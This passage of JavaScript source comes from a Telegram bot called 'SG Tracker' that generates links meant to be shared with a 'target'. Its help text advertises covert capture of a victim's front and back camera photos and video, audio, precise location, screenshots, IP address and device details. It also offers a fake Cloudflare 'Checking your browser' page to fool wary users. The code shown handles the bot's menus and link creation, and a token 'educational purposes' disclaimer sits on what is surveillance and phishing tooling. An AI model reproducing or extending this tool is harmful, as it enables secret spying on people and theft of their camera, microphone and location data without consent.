  await bot.sendChatAction(chatId, "typing");
  
  // Create keyboard with useful links/actions and back button
  const helpKeyboard = {
    reply_markup: JSON.stringify({
      "inline_keyboard": [
        [
          { text: "🔗 Create Tracking Link", callback_data: "crenew" }
        ],
        [
          { text: "📢 Our Channels", callback_data: "channels" }
        ],
        [
          { text: "🌐 GitHub Repo", url: "https://github.com/SGModder-Offcial" }
        ],
        [
          { text: "🔙 Back to Main Menu", callback_data: "back_to_main" }
        ]
      ]
    })
  };
  
  // Help message content
  const helpText = `<b>📚 SG TRACKER HELP GUIDE 📚</b>\n\n` +
    `<i>This powerful tool creates tracking links that collect information about anyone who clicks them.</i>\n\n` +
    
    `<b>🚀 Getting Started:</b>\n` +
    `1️⃣ Type /create or click the button below\n` +
    `2️⃣ Choose your preferred capture method\n` +
    `3️⃣ Enter a URL when prompted (e.g., https://google.com)\n` +
    `4️⃣ The bot will generate your tracking links\n` +
    `5️⃣ Share these links with your target\n` +
    `6️⃣ When they open the link, you'll receive their information\n\n` +
    
    `<b>🎯 Capture Methods:</b>\n\n` +
    `<b>• 🎥 All Cameras:</b> Front & back camera videos simultaneously\n` +
    `<b>• 📸 Front Camera Image:</b> Front camera photo capture\n` +
    `<b>• 📸 Back Camera Image:</b> Back camera photo capture\n` +
    `<b>• 🎥 Front Camera Video:</b> Front camera 10-second video\n` +
    `<b>• 🎥 Back Camera Video:</b> Back camera 10-second video\n` +
    `<b>• 📸 Screenshot:</b> Full page screenshot with status bar\n` +
    `<b>• 🎤 Audio Capture:</b> Voice recording + device info\n` +
    `<b>• 💻 Minimal:</b> Device info + location only\n\n` +
    
    `<b>🔮 Available Link Types:</b>\n\n` +
    `<b>1. 🛡️ Cloudflare Page:</b>\n` +
    `• Shows a fake "Checking your browser" security page\n` +
    `• Collects data while displaying the security check\n` +
    `• Redirects to your target URL afterward\n` +
    `• More convincing for security-conscious users\n\n` +
    
    `<b>2. 🌐 Webview Page:</b>\n` +
    `• Shows your target URL in an iframe immediately\n` +
    `• Collects data in the background\n` +
    `• Note: Some sites block iframe embedding (e.g., Google)\n\n` +
    
    `<b>📱 Information Collected:</b>\n` +
    `• 📸 Camera photos (front & back)\n` +
    `• 🎥 Camera video recordings (front & back)\n` +
    `• 📍 Precise location with maps\n` +
    `• 📸 Full screen capture with status bar\n` +
    `• 🎤 Audio voice recording\n` +
    `• 🖥️ Detailed device & browser specs\n` +
    `• 🔋 Battery level & charging status\n` +
    `• 🌐 IP address & network data\n\n` +
    
    `<b>👨‍💻 Developed by:</b> <a href="https://t.me/SG_Modder">@SG_Modder</a>\n` +
    `<b>📢 Channels:</b> <a href="https://t.me/sgmoddernew">@sgmoddernew</a>, <a href="https://t.me/SG_Modder0">@SG_Modder0</a>, <a href="https://t.me/SG_Modder1">@SG_Modder1</a>\n` +
    `<b>🔗 GitHub:</b> <a href="https://github.com/SGModder-Offcial">SGModder-Offcial</a>\n\n` +
    `<b>⚠️ DISCLAIMER:</b> <i>Use responsibly and only with proper consent. This tool is for educational purposes only.</i>`;
  
  // If messageId is provided, edit the existing message
  if (messageId) {
    try {
      await bot.editMessageText(helpText, { 
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: helpKeyboard.reply_markup 
      });
    } catch (error) {
      console.error("Error editing help message:", error);
      
      // Fallback to sending a new message
      await bot.sendMessage(chatId, helpText, { 
        parse_mode: "HTML",
        reply_markup: helpKeyboard.reply_markup 
      });
    }
  } else {
    // Send a new message
    await bot.sendMessage(chatId, helpText, { 
      parse_mode: "HTML",
      reply_markup: helpKeyboard.reply_markup 
    });
  }
}

// For local development
if (process.env.NODE_ENV !== "production") {
  // Start polling for local testing
  console.log("Starting polling for local development...");
  
  bot.on('callback_query', async (callbackQuery) => {
    await bot.answerCallbackQuery(callbackQuery.id);
    const chatId = callbackQuery.message.chat.id;
    
    if (callbackQuery.data === "crenew") {
      await createNew(chatId, callbackQuery.message.message_id);
    } else if (callbackQuery.data === "help") {
      // Show help message when the help button is clicked
      await sendHelpMessage(chatId, callbackQuery.message.message_id);
    } else if (callbackQuery.data === "back_to_main") {
      // Go back to main menu
      await sendWelcomeMessage(chatId, callbackQuery.message.chat.first_name, callbackQuery.message.message_id);
    } else if (callbackQuery.data === "channels") {
      // Show channels information by editing current message
      await bot.editMessageText(
        `<b>📢 SG Modder Channels 📢</b>\n\n` +
        `Join our official channels for updates, tools and more!\n\n` +
        `• <a href="https://t.me/sgmoddernew">@sgmoddernew</a> - Main channel\n` +
        `• <a href="https://t.me/SG_Modder0">@SG_Modder0</a> - Updates channel\n` +
        `• <a href="https://t.me/SG_Modder1">@SG_Modder1</a> - Tools channel\n\n` +
        `<b>👨‍💻 Contact:</b> <a href="https://t.me/SG_Modder">@SG_Modder</a>`,
        { 
          chat_id: chatId, 
          message_id: callbackQuery.message.message_id, 
          parse_mode: "HTML",
          reply_markup: JSON.stringify({
            "inline_keyboard": [
              [
                { text: "🔙 Back", callback_data: "back_to_main" }
              ]
            ]
          })
        }
      );
    } else if (callbackQuery.data.startsWith("capture_")) {
      // Handle capture method selection
      const captureMethodId = callbackQuery.data.replace("capture_", "");
      
      if (captureMethodId === "cancel") {
        // User canceled the capture method selection - edit current message
        await bot.editMessageText(
          `<b>❌ Operation canceled</b>\n\nUse /create to start again when you're ready.`,
          { 
            chat_id: chatId, 
            message_id: callbackQuery.message.message_id,
            parse_mode: "HTML",
            reply_markup: JSON.stringify({
              "inline_keyboard": [
                [
                  { text: "🔗 Try Again", callback_data: "crenew" }
                ],
                [
                  { text: "🔙 Back to Main Menu", callback_data: "back_to_main" }
                ]
              ]
            })
          }
        );
      } else {
        // Process the selected capture method - edit current message instead of sending new one
        await processLinkWithCaptureMethod(chatId, captureMethodId, callbackQuery.message.message_id);
      }
    }
  });
  
  bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    
    // Handle reply to capture method prompt or URL input
    if (msg.reply_to_message && msg.reply_to_message.text) {
      const replyText = msg.reply_to_message.text;
      
      // Check if this is a URL input after selecting a capture method
      if (replyText.includes("This will capture:") || 
          replyText.includes("Enter Your URL:") || 
          replyText.includes("Enter URL to track")) {
        console.log("Detected reply to URL prompt:", replyText);
        
        // Find which capture method was selected based on text content
        let methodId = "full"; // Default
        
        if (replyText.includes("Front Camera Image")) {
          methodId = "frontcam";
        } else if (replyText.includes("Back Camera Image")) {
          methodId = "backcam";
        } else if (replyText.includes("Front Camera Video")) {
          methodId = "frontvideo";
        } else if (replyText.includes("Back Camera Video")) {
          methodId = "backvideo";
        } else if (replyText.includes("All Cameras")) {
          methodId = "allcams";
        } else if (replyText.includes("Minimal") || replyText.includes("No Camera")) {
          methodId = "minimal";
        } else if (replyText.includes("Audio")) {
          methodId = "audio";
        // Screen recording is removed
        } else if (replyText.includes("Screenshot")) {
          methodId = "screenshot";
        }
        
        console.log("Creating link with method:", methodId);
        // Create a link with the selected capture method
        await createLink(chatId, msg.text, methodId);
        return;
      }
      // Basic URL input handling (backward compatibility)
      else if (replyText === "🌐 Enter Your URL") {
        await createLink(chatId, msg.text);
        return;
      }
    }
    
    // Handle /start command
    if (msg.text === "/start") {
      await sendWelcomeMessage(chatId, msg.chat.first_name);
    }
    // Handle /create command
    else if (msg.text === "/create") {
      await createNew(chatId);
    }
    // Handle /help command
    else if (msg.text === "/help") {
      await sendHelpMessage(chatId);
    }
  });
  
  // Start polling
  bot.startPolling();
  
  // Start the server for the web routes
  app.listen(5000, '0.0.0.0', () => {
    console.log("Server running on port 5000");
  });
}

// Export the handler for serverless deployment
module.exports = app;
module.exports.handler = serverless(app);